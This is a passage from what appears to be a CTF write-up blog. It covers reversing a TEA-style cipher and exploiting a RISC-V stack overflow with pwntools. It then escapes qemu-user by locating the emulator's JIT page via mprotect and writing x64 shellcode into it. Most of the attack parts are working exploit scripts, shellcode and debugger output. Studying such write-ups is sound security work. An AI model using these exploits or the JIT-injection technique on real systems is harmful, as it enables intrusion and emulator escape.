class="number">1</span>] ^ local_1c + local_18 ^ local_18 * <span class="number">0x10</span> + *param_2) +</span><br><span class="line">               local_14;</span><br><span class="line">    local_18 = ((local_14 &gt;&gt; <span class="number">5</span>) + param_2[<span class="number">3</span>] ^ local_1c + local_14 ^ local_14 * <span class="number">0x10</span> + param_2[<span class="number">2</span>]) +</span><br><span class="line">               local_18;</span><br><span class="line">    local_20 = local_20 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *param_1 = local_14;</span><br><span class="line">  param_1[<span class="number">1</span>] = local_18;</span><br><span class="line">  gp = (undefined *)<span class="number">0x6f178</span>;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>My first idea was to brute force the key because the first part of the flag suggested that it consisted of only the lower case alphabet. I even wrote a simple python script for this task, but it was too slow. Later, I realized that it was possible to reverse this function and write a decrypt function. So I wrote a simple C program to get the rest of the flag.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> key[<span class="number">4</span>] = &#123;<span class="number">0x1368a0bb</span>, <span class="number">0x190ace1e</span>,<span class="number">0x35d8a357</span>,<span class="number">0x26bf2c61</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">reverse</span><span class="params">(<span class="keyword">int</span> tmp, <span class="keyword">unsigned</span> <span class="keyword">int</span> a1, <span class="keyword">unsigned</span> <span class="keyword">int</span> a2)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line">    <span class="keyword">while</span> (i &lt; <span class="number">0x10</span>) &#123;</span><br><span class="line">        a2 = a2 - ((a1 &gt;&gt; <span class="number">5</span>) + key[<span class="number">3</span>] ^ tmp + a1 ^ a1 * <span class="number">0x10</span> + key[<span class="number">2</span>]);</span><br><span class="line">        a1 = a1 - ((a2 &gt;&gt; <span class="number">5</span>) + key[<span class="number">1</span>] ^ tmp + a2 ^ a2 * <span class="number">0x10</span> + key[<span class="number">0</span>]);</span><br><span class="line">        tmp += <span class="number">0x61c88647</span>;</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(buf, &amp;a1, <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(buf+<span class="number">4</span>, &amp;a2, <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">0x10</span>; i++) &#123;</span><br><span class="line">        tmp += <span class="number">-0x61c88647</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    reverse(tmp,<span class="number">0xc45087f9</span>, <span class="number">0x0703f2b2</span>);</span><br><span class="line">    reverse(tmp,<span class="number">0x6974f43c</span>, <span class="number">0xedb4bb59</span>);</span><br><span class="line">    reverse(tmp,<span class="number">0x0ff0b02a</span>, <span class="number">0x008520f2</span>);</span><br><span class="line">    reverse(tmp,<span class="number">0xfdcd23dd</span>, <span class="number">0x35024875</span>);</span><br><span class="line">    reverse(tmp,<span class="number">0xf1d7b6d3</span>, <span class="number">0x74f21be1</span>);</span><br><span class="line">    reverse(tmp,<span class="number">0xcb2dbf12</span>, <span class="number">0xa4b453f6</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>It printed <code>_if_you_have_hexriscv_plz_share_it_with_me_thx:P}</code> , so the final flag for this checkpoint is <code>flag{have_you_tried_ghidra9.2_decompiler_if_you_have_hexriscv_plz_share_it_with_me_thx:P}</code></p>
<h2 id="Favourite-Architecture-1"><a href="#Favourite-Architecture-1" class="headerlink" title="Favourite Architecture 1"></a>Favourite Architecture 1</h2><p>Before I analyzed the vulnerability, I saw that there was a moment when more teams solved Favourite Architecture 1 than 0, so the vulnerability is independent of the verification of reversing challenge. And it is pretty obvious for a sophisticated pwner to find the <code>gets</code> function to receive input.</p>
<p>Because the binary itself does not have any mitigations, we can have many choices to achieve RCE, including the old school nop-sled technique. However, we want to get a stable trigger on the remote machine, so I spent some time to find a gadget that can hit the shellcode unconditionally. I chose to jump to <code>0x10442</code>, because we can control s0, and set the argument of <code>gets</code> to some address on .bss, then when the main function finishes, we can pivot to bss and execute the shellcode receive from the second <code>gets</code>.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">010442</span> <span class="number">93</span> <span class="number">07</span> <span class="number">84</span> ed       addi   a5,s0,<span class="number">-0x128</span></span><br><span class="line"><span class="number">010446</span> <span class="number">3</span>e <span class="number">85</span>             c.mv   a0,a5</span><br><span class="line"><span class="number">010448</span> ef <span class="number">60</span> <span class="number">20</span> <span class="number">61</span>       jal    ra,<span class="function">gets                     undefined <span class="title">gets</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure></p>
<p>The exploit is not complicated:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">env = &#123;<span class="string">'LD_PRELOAD'</span>: <span class="string">''</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    p = process(<span class="string">'./cmd'</span>)</span><br><span class="line">    is_remote = <span class="literal">False</span></span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">    p = remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    is_remote = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> is_remote:</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    <span class="comment"># subprocess.call(['tmux', 'split-window', '-h', 'gdb-multiarch', '-x', '1.gdb'])</span></span><br><span class="line"></span><br><span class="line">sc = open(<span class="string">"sc.bin"</span>, <span class="string">"rb"</span>).read()</span><br><span class="line"><span class="keyword">assert</span> <span class="string">"\n"</span> <span class="keyword">not</span> <span class="keyword">in</span> sc</span><br><span class="line"></span><br><span class="line">gets = <span class="number">0x16a5a</span></span><br><span class="line">call_gets = <span class="number">0x10442</span></span><br><span class="line"></span><br><span class="line">data = cyclic(<span class="number">280</span>) + p64(<span class="number">0x6f000</span> + <span class="number">0x128</span>)</span><br><span class="line">data += p64(call_gets)</span><br><span class="line">data += cyclic(<span class="number">504</span>) + p64(<span class="number">0x6f000</span>)</span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br><span class="line">sla(<span class="string">"flag:"</span>, data)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># flag1: flag&#123;an_easy_rv64_stack_overflow_in_qemu_user&#125;</span></span><br></pre></td></tr></table></figure></p>
<p><code>sc.bin</code> contains the raw shellcode and can be generated by following assmbly code, which is modified from my previous writeup: <a href="https://matshao.com/2020/05/18/DEFCON-2020-Quals-nooopsled/">https://matshao.com/2020/05/18/DEFCON-2020-Quals-nooopsled/</a><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># riscv64-linux-gnu-as sc.<span class="keyword">asm</span> -o sc</span><br><span class="line"># riscv64-linux-gnu-objcopy -S -O binary -j .text sc sc.bin</span><br><span class="line"></span><br><span class="line">.section .text</span><br><span class="line">.globl _start</span><br><span class="line">.option rvc</span><br><span class="line">_start:</span><br><span class="line"></span><br><span class="line">    <span class="meta">#open</span></span><br><span class="line">    li a1,<span class="number">0x67616c66</span> <span class="meta">#flag</span></span><br><span class="line">    sd a1,<span class="number">8</span>(sp)</span><br><span class="line">    addi a1,sp,<span class="number">8</span></span><br><span class="line">    li a0,<span class="number">-100</span></span><br><span class="line">    li a2,<span class="number">0</span></span><br><span class="line">    li a7, <span class="number">56</span> # __NR_open</span><br><span class="line">	</span><br><span class="line">	ecall</span><br><span class="line">	c.mv a2,a7</span><br><span class="line">	addi a7,a7,<span class="number">7</span></span><br><span class="line"></span><br><span class="line">	ecall</span><br><span class="line">	li a0, <span class="number">1</span></span><br><span class="line">	addi a7,a7,<span class="number">1</span></span><br><span class="line">	ecall</span><br></pre></td></tr></table></figure></p>
<h2 id="Favourite-Architecture-2"><a href="#Favourite-Architecture-2" class="headerlink" title="Favourite Architecture 2"></a>Favourite Architecture 2</h2><p>This checkpoint is the highlight of the challenges. We are required to execute <code>readflag2</code> to get the flag. We already get RCE in RISCV in the last checkpoint, but <code>readflag2</code> is an <code>x64</code> elf, so we need to get RCE from <code>qemu-riscv64</code> to execute it.<br>The hint for this task is the syscall white list from the patch file, we are supposed to get RCE in qemu user space emulator with these syscalls..<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">+        <span class="keyword">case</span> TARGET_NR_brk:</span><br><span class="line">+        <span class="keyword">case</span> TARGET_NR_uname:</span><br><span class="line">+        <span class="keyword">case</span> TARGET_NR_readlinkat:</span><br><span class="line">+        <span class="keyword">case</span> TARGET_NR_faccessat:</span><br><span class="line">+        <span class="keyword">case</span> TARGET_NR_openat2:</span><br><span class="line">+        <span class="keyword">case</span> TARGET_NR_openat:</span><br><span class="line">+        <span class="keyword">case</span> TARGET_NR_read:</span><br><span class="line">+        <span class="keyword">case</span> TARGET_NR_readv:</span><br><span class="line">+        <span class="keyword">case</span> TARGET_NR_write:</span><br><span class="line">+        <span class="keyword">case</span> TARGET_NR_writev:</span><br><span class="line">+        <span class="keyword">case</span> TARGET_NR_mmap:</span><br><span class="line">+        <span class="keyword">case</span> TARGET_NR_munmap:</span><br><span class="line">+        <span class="keyword">case</span> TARGET_NR_exit:</span><br><span class="line">+        <span class="keyword">case</span> TARGET_NR_exit_group:</span><br><span class="line">+        <span class="keyword">case</span> TARGET_NR_mprotect:</span><br></pre></td></tr></table></figure></p>
<p>I guess the purpose of this challenge is not to find some 0day in the qemu user emulator implementation, but more likely get RCE with some logic bugs. When attached gdb to <code>qemu-riscv6i4</code> process and print the memory maps, we can see that there is a region with <code>rwx</code> property ( 0x7fffe8000000-0x7fffeffff000). It is used for the JIT code generator. And if attach gdb to the gdb stubs from qemu user emulator, the vmmap command shows that all memroy is <code>rwx</code> , though this result is not so convincing, it make me think of that maybe we could access the JIT code page from riscv user space. If it works, then we can write some x64 shellcode to the JIT code page and make the emulator execute it.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">vmmap of qemu-riscv64</span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">           <span class="number">0x10000</span>            <span class="number">0x6a000</span> r--p    <span class="number">5</span>a000 <span class="number">0</span>      /pwn/test</span><br><span class="line">           <span class="number">0x6a000</span>            <span class="number">0x6b000</span> ---p     <span class="number">1000</span> <span class="number">0</span></span><br><span class="line">           <span class="number">0x6b000</span>            <span class="number">0x6e000</span> rw-p     <span class="number">3000</span> <span class="number">5</span>a000  /pwn/test</span><br><span class="line">           <span class="number">0x6e000</span>            <span class="number">0x92000</span> rw-p    <span class="number">24000</span> <span class="number">0</span></span><br><span class="line">      <span class="number">0x4000000000</span>       <span class="number">0x4000001000</span> ---p     <span class="number">1000</span> <span class="number">0</span></span><br><span class="line">      <span class="number">0x4000001000</span>       <span class="number">0x4000801000</span> rw-p   <span class="number">800000</span> <span class="number">0</span></span><br><span class="line">    <span class="number">0x555555554000</span>     <span class="number">0x5555559bd000</span> r-xp   <span class="number">469000</span> <span class="number">0</span>      /pwn/qemu-riscv64</span><br><span class="line">    <span class="number">0x555555bbc000</span>     <span class="number">0x555555bf8000</span> r--p    <span class="number">3</span>c000 <span class="number">468000</span> /pwn/qemu-riscv64</span><br><span class="line">    <span class="number">0x555555bf8000</span>     <span class="number">0x555555c24000</span> rw-p    <span class="number">2</span>c000 <span class="number">4</span>a4000 /pwn/qemu-riscv64</span><br><span class="line">    <span class="number">0x555555c24000</span>     <span class="number">0x555555ce9000</span> rw-p    c5000 <span class="number">0</span>      [heap]</span><br><span class="line">    <span class="number">0x7fffe8000000</span>     <span class="number">0x7fffeffff000</span> rwxp  <span class="number">7f</span>ff000 <span class="number">0</span></span><br><span class="line">    <span class="number">0x7fffeffff000</span>     <span class="number">0x7ffff0000000</span> ---p     <span class="number">1000</span> <span class="number">0</span></span><br><span class="line">    <span class="number">0x7ffff0000000</span>     <span class="number">0x7ffff0021000</span> rw-p    <span class="number">21000</span> <span class="number">0</span></span><br><span class="line">    <span class="number">0x7ffff0021000</span>     <span class="number">0x7ffff4000000</span> ---p  <span class="number">3f</span>df000 <span class="number">0</span></span><br><span class="line">    <span class="number">0x7ffff6c43000</span>     <span class="number">0x7ffff6cc4000</span> rw-p    <span class="number">81000</span> <span class="number">0</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vmmap when connect to gdb stub provide by qemu-riscv64</span><br><span class="line">gef➤  vmmap</span><br><span class="line">[ Legend:  Code | Heap | Stack ]</span><br><span class="line">Start              End                Offset             Perm Path</span><br><span class="line"><span class="number">0x0000000000000000</span> <span class="number">0xffffffffffffffff</span> <span class="number">0x0000000000000000</span> rwx /pwn/test</span><br></pre></td></tr></table></figure>
<p>But we need to know the address of JIT code page. My first idea is checking <code>/proc/self/map</code> from riscv program. I wrote a simple program and compiled it as static riscv elf, then execute it with <code>qemu-riscv64</code>. It seems that the emulator has special logic to deal with these proc file, we could not read any emulator address from it.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">10000-6a000 r--p 00000000 00:35 144454                                   /pwn/test</span><br><span class="line">6a000-6b000 ---p 00000000 00:00 0</span><br><span class="line">6b000-6e000 rw-p 0005a000 00:35 144454                                   /pwn/test</span><br><span class="line">6e000-92000 rw-p 00000000 00:00 0</span><br><span class="line">4000000000-4000001000 ---p 00000000 00:00 0</span><br><span class="line">4000001000-4000801000 rw-p 00000000 00:00 0                              [stack]</span><br></pre></td></tr></table></figure></p>
<p>I also tried searching for JIT page pointer from <code>0x1000</code> to <code>4000801000</code>, but it does not work. I noticed that there is some memory-related syscall from the whitelist, maybe we can use them to search for the JIT page address? It sounds worth trying!<br>I wrote a simple function to brute-force the JIT code page address with mprotect. By running the emulator several time, we find the address can be divide by <code>0x000004000000</code>. Then the reason why we check the address of <code>va+0x4000</code> instead of <code>va</code> is that we the JIT code will locate from the start of the memory page, we need to avoid the running JIT code. Otherwise, the emulator will crash.<br>We compile the program as static riscv elf, and it successfully gives us the address of JIT page address.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> test_map() &#123;</span><br><span class="line">    <span class="keyword">size_t</span> va = <span class="number">0x7f0000000000</span>;</span><br><span class="line">    <span class="keyword">size_t</span> inc = <span class="number">0x000004000000</span>; </span><br><span class="line">    <span class="keyword">int</span> res;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        res = mprotect(va+<span class="number">0x4000</span>, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE|PROT_EXEC);</span><br><span class="line">        <span class="keyword">if</span> (res &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"find: %lx\n"</span>, va);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        va += inc;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> va;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>Then we add the x64 shellcode injection logic to test if we can hijack the control flow by writing JIT code page, we tried to inject a x64 shellcode to print “here”, and it did work.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">breakpoint</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    getchar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// echo here shellcode</span></span><br><span class="line"><span class="keyword">char</span> sc[] = &#123;<span class="number">0x68</span>, <span class="number">0x68</span>, <span class="number">0x65</span>, <span class="number">0x72</span>, <span class="number">0x65</span>, <span class="number">0x6a</span>, <span class="number">0x1</span>, <span class="number">0x58</span>, <span class="number">0x6a</span>, <span class="number">0x1</span>, <span class="number">0x5f</span>, <span class="number">0x6a</span>, <span class="number">0x4</span>, <span class="number">0x5a</span>, <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="number">0xf</span>, <span class="number">0x5</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> * VA;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> test_map() &#123;</span><br><span class="line">    <span class="keyword">size_t</span> va = <span class="number">0x7f0000000000</span>;</span><br><span class="line">    <span class="keyword">size_t</span> inc = <span class="number">0x000004000000</span>; </span><br><span class="line">    <span class="keyword">int</span> res;</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        res = mprotect(va+<span class="number">0x4000</span>, <span class="number">0x1000</span>, PROT_READ|PROT_WRITE|PROT_EXEC);</span><br><span class="line">        <span class="keyword">if</span> (res &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"find: %lx\n"</span>, va);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        va += inc;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> va;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> pid;</span><br><span class="line">    <span class="keyword">char</span> *addr;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0x90</span>, <span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(buf+<span class="number">0x80</span>, sc, <span class="number">19</span>);</span><br><span class="line">    addr = (<span class="keyword">char</span> *)test_map();</span><br><span class="line">    fflush(<span class="number">0</span>);</span><br><span class="line">    breakpoint();</span><br><span class="line">    <span class="built_in">memcpy</span>(addr, sc, <span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">// memset(addr, 0xcc, 100);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@matthew-Virtual-Machine:/pwn# ./qemu-riscv64  ./test</span><br><span class="line">[!] <span class="number">80</span> bad system call</span><br><span class="line">find: <span class="number">7f</span>c480000000</span><br><span class="line">[!] <span class="number">80</span> bad system call</span><br><span class="line"><span class="function">hereSegmentation <span class="title">fault</span> <span class="params">(core dumped)</span></span></span><br></pre></td></tr></table></figure>
<p>Well, from this experiment, we know that we can search for the JIT code page address with mprotect, and also write x64 shellcode to the page and get RCE from the emulator. Next step is to construct RISCV shellcode for the job.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"># riscv64-linux-gnu-as sc1.<span class="keyword">asm</span> -o sc</span><br><span class="line"># riscv64-linux-gnu-objcopy -S -O binary -j .text sc sc.bin</span><br><span class="line">_start:</span><br><span class="line"></span><br><span class="line">	li a3, BASE </span><br><span class="line">	li a4, INC</span><br><span class="line">	li a5, <span class="number">0xf000</span></span><br><span class="line">loop:</span><br><span class="line">	add a0, a3, a5 </span><br><span class="line">	li a1, <span class="number">0x1000</span></span><br><span class="line">	li a2, <span class="number">7</span></span><br><span class="line">	li a7, <span class="number">226</span> <span class="meta"># mprotect</span></span><br><span class="line">	ecall</span><br><span class="line"></span><br><span class="line">	beq a0, zero, succ </span><br><span class="line">	add a3, a3, a4 </span><br><span class="line">	j loop </span><br><span class="line"></span><br><span class="line">succ:</span><br><span class="line">	<span class="meta"># try output a3</span></span><br><span class="line">	li a1, <span class="number">0x6f200</span></span><br><span class="line">	sd a3, <span class="number">0</span>(a1)</span><br><span class="line">	li a0, <span class="number">1</span></span><br><span class="line">	li a2, <span class="number">0x10</span></span><br><span class="line">	li a7, <span class="number">64</span> <span class="meta"># write</span></span><br><span class="line">	ecall</span><br><span class="line">	<span class="meta"># rwx page at a3</span></span><br><span class="line">	<span class="meta"># read(0, a3, 0x200)</span></span><br><span class="line">	li a0, <span class="number">0</span></span><br><span class="line">	li a1, <span class="number">0x6f200</span> # x86 sc buf</span><br><span class="line">	li a2, <span class="number">0x200</span></span><br><span class="line"></span><br><span class="line">	li a7, <span class="number">63</span> <span class="meta"># read</span></span><br><span class="line">	ecall </span><br><span class="line"></span><br><span class="line">	<span class="meta"># copy from 0x70000 to a3</span></span><br><span class="line">	addi a3, a3, <span class="number">0x200</span> #<span class="number">22</span>c</span><br><span class="line">	addi a1, a1, <span class="number">0x200</span></span><br><span class="line">	li a2, <span class="number">0x80</span></span><br><span class="line">copy:</span><br><span class="line">	ld a5, <span class="number">0</span>(a1)</span><br><span class="line">	sd a5, <span class="number">0</span>(a3)</span><br><span class="line">	addi a1, a1, <span class="number">-4</span> </span><br><span 